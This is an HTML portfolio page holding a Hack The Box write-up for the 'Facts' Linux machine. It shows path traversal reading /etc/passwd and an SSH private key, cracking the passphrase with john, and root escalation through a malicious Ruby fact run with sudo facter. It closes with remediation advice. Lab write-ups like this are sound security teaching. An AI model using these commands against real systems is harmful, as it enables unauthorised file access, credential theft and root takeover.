@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facts Writeup | Koussay Aydi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">← Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Linux Easy</span>
+            <h1>Facts Writeup</h1>
+            <p><strong>Author:</strong> Atrox | <strong>Tags:</strong> Path Traversal, LFI, SSH Key Cracking, Facter, Privilege Escalation</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>1. Introduction</h2>
+            <p><strong>Facts</strong> is an Easy-rated Linux machine on HackTheBox. It presents a realistic attack chain covering authenticated LFI, credential recovery via SSH key cracking, and privilege escalation through the abuse of Facter custom facts.</p>
+
+            <h2>2. Reconnaissance</h2>
+            <h3>2.1 Port Scanning</h3>
+            <pre><code>nmap -sV 10.129.20.114</code></pre>
+            <table>
+                <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+                <tbody>
+                    <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.9p1</td></tr>
+                    <tr><td>80/tcp</td><td>HTTP</td><td>nginx 1.26.3</td></tr>
+                </tbody>
+            </table>
+
+            <h2>3. Web Application Enumeration</h2>
+            <p>The application at <code>facts.htb</code> contains an admin panel. Enumeration revealed a suspicious endpoint used for file downloads:</p>
+            <pre><code>http://facts.htb/admin/media/download_private_file?file=&lt;filename&gt;</code></pre>
+
+            <h2>4. Exploitation — Path Traversal / LFI</h2>
+            <h3>4.1 Confirming the Vulnerability</h3>
+            <p>By injecting traversal sequences, we can bypass the intended directory. Testing with <code>/etc/passwd</code>:</p>
+            <pre><code>http://facts.htb/admin/media/download_private_file?file=../../../../../etc/passwd</code></pre>
+            <p>The server returns the file content, identifying two primary users: <code>trivia</code> (UID 1000) and <code>william</code> (UID 1001).</p>
+
+            <h3>4.2 Retrieving Flags and Keys</h3>
+            <ul>
+                <li><strong>User Flag:</strong> Located at <code>/home/william/user.txt</code>.</li>
+                <li><strong>SSH Key:</strong> Found at <code>/home/trivia/.ssh/id_ed25519</code>.</li>
+            </ul>
+            <p>The SSH key is encrypted with AES-256-CTR and protected by a passphrase.</p>
+
+            <h2>5. Initial Access — SSH as trivia</h2>
+            <h3>5.1 Cracking the Passphrase</h3>
+            <p>We use <code>ssh2john</code> to prepare the hash and <code>john</code> with <code>rockyou.txt</code>:</p>
+            <pre><code>ssh2john trivia_key > trivia_hash
+john --wordlist=/usr/share/wordlists/rockyou.txt trivia_hash</code></pre>
+            <p><strong>Passphrase found:</strong> <code>dragonballz</code></p>
+
+            <h3>5.2 SSH Login</h3>
+            <pre><code>ssh trivia@10.129.20.114 -i trivia_key</code></pre>
+
+            <h2>6. Privilege Escalation — Facter Abuse</h2>
+            <h3>6.1 Sudo Privileges</h3>
+            <pre><code>trivia@facts:~$ sudo -l
+...
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter</code></pre>
+
+            <h3>6.2 Exploiting --custom-dir</h3>
+            <p>Facter allows loading custom Ruby scripts via the <code>--custom-dir</code> flag. Since we can run it as root, we can execute arbitrary Ruby code.</p>
+            <p><strong>Step 1: Create a malicious Ruby fact:</strong></p>
+            <pre><code>mkdir -p /tmp/pwn
+cat > /tmp/pwn/shell.rb << 'EOF'
+Facter.add('shell') do
+  setcode do
+    system('/bin/bash')
+    "done"
+  end
+end
+EOF</code></pre>
+
+            <p><strong>Step 2: Execute with sudo:</strong></p>
+            <pre><code>sudo /usr/bin/facter --custom-dir /tmp/pwn shell</code></pre>
+            <p>This spawns a shell as <strong>root</strong>.</p>
+
+            <h2>7. Vulnerability Summary</h2>
+            <table>
+                <thead><tr><th>Vulnerability</th><th>Location</th><th>Impact</th></tr></thead>
+                <tbody>
+                    <tr><td>Path Traversal / LFI</td><td>download_private_file</td><td>Critical - File Read</td></tr>
+                    <tr><td>Weak Passphrase</td><td>SSH Private Key</td><td>High - Account Compromise</td></tr>
+                    <tr><td>Insecure Sudo Rule</td><td>/usr/bin/facter</td><td>Critical - Root RCE</td></tr>
+                </tbody>
+            </table>
+
+            <h2>8. Remediation Recommendations</h2>
+            <ul>
+                <li><strong>Sanitize Input:</strong> Use an allowlist for filenames or canonicalize paths before reading files.</li>
+                <li><strong>File Permissions:</strong> Ensure sensitive directories like <code>.ssh</code> are not readable by the web service user.</li>
+                <li><strong>Restrict Sudo:</strong> Avoid <code>NOPASSWD</code> for binaries that allow loading external scripts or code.</li>
+            </ul>
+
+            <div class="attack-chain">
+                <h3>Attack Summary</h3>
+                <pre><code>LFI → /etc/passwd → SSH Key Disclosure → Passphrase Cracking → SSH Shell → Facter --custom-dir → Root</code></pre>
+            </div>
+
+            <div style="margin-top: 50px;">
+                <a href="index.html" class="btn btn-primary">Return Home</a>
+            </div>
+        </article>
+    </main>
+</body>
+</html>
